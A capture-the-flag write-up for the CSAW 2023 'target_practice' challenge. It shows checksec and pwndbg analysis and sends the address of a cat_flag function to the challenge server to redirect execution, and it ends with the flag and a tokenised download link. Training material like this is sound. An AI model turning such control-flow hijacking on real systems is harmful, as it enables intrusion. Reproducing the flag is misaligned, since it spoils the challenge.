# target\_practice

> Aim carefully... This pwnie can JUMP!&#x20;
>
> Author: `ElykDeer`&#x20;
>
> Connect with:&#x20;
>
> `nc intro.csaw.io 31138`&#x20;
>
> [target\_practice](https://ctf.csaw.io/files/c6114a63507eed08fa2523cebd848f26/target\_practice?token=eyJ1c2VyX2lkIjoxMzYwLCJ0ZWFtX2lkIjo1NjksImZpbGVfaWQiOjI2fQ.ZQSKuQ.klqJwPq9exGMJ0txJS0YZBqRsoA)

* We can connect to the program using the following command:

```
$ nc intro.csaw.io 31138
Aim carefully....
```

* So it asks us to aim carefully? Is it going to perform some sort of jump?
* Let's look at the file type.

```
$ file target_practice
target_practice: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c2ae3c4733d9761d5043faa90d68371e52d74bc2, not stripped
```

* We can see that it is a binary executable.
* Using the `checksec` utility, we can also see the security properties of the file.

```
$ checksec target_practice 
[*] '/home/hacker/csaw23/targetPractice/target_practice'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

* There's two important properties we want to focus on here:
  * `NX enabled`: This means that the stack is not executable. Therefore we cannot use a shellcode injection.
  * `No PIE (0x400000)`: This means that the executable is not positionally independent and it is always loaded at address `0x400000`. So the code and memory regions will have the same address every time we run it.
* Let's look at the functions present in the binary.

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000004005a8  _init
0x00000000004005d0  __stack_chk_fail@plt
0x00000000004005e0  system@plt
0x00000000004005f0  printf@plt
0x0000000000400600  fflush@plt
0x0000000000400610  setvbuf@plt
0x0000000000400620  __isoc99_scanf@plt
0x0000000000400630  _start
0x0000000000400660  _dl_relocate_static_pie
0x0000000000400670  deregister_tm_clones
0x00000000004006a0  register_tm_clones
0x00000000004006e0  __do_global_dtors_aux
0x0000000000400710  frame_dummy
0x0000000000400717  cat_flag
0x000000000040072a  main
0x00000000004007f0  __libc_csu_init
0x0000000000400860  __libc_csu_fini
0x0000000000400864  _fini
```

* The `cat_flag` function seems interesting, let's disassemble it and see.

```
pwndbg> disassemble cat_flag
Dump of assembler code for function cat_flag:
   0x0000000000400717 <+0>:     push   rbp
   0x0000000000400718 <+1>:     mov    rbp,rsp
   0x000000000040071b <+4>:     lea    rdi,[rip+0x152]        # 0x400874
   0x0000000000400722 <+11>:    call   0x4005e0 <system@plt>
   0x0000000000400727 <+16>:    nop
   0x0000000000400728 <+17>:    pop    rbp
   0x0000000000400729 <+18>:    ret
End of assembler dump.
```

* The `cat_Flag` function is located at the address `0x0000000000400717`.
* If we look at the instruction at `cat_flag+11`, we can see a system call. The instruction at `cat_flag+4` loads the argument for that same system call.

```
pwndbg> x/s 0x400874
0x400874:       "cat /flag.txt"
```

* On examining the argument, we can see that it is in executing `cat` with the `flag.txt` file. Now we know that the `ret2win` function needs to be called in order to get the flag.
* So the `cat_flag` function does actually give us the flag. Let's connect again and provide the address `0x0000000000400717` as the input.

```
$ nc intro.csaw.io 31138
Aim carefully.... 0x0000000000400717
csawctf{y0ure_a_m4s7er4im3r}
```

### Flag

```
csawctf{y0ure_a_m4s7er4im3r}
```
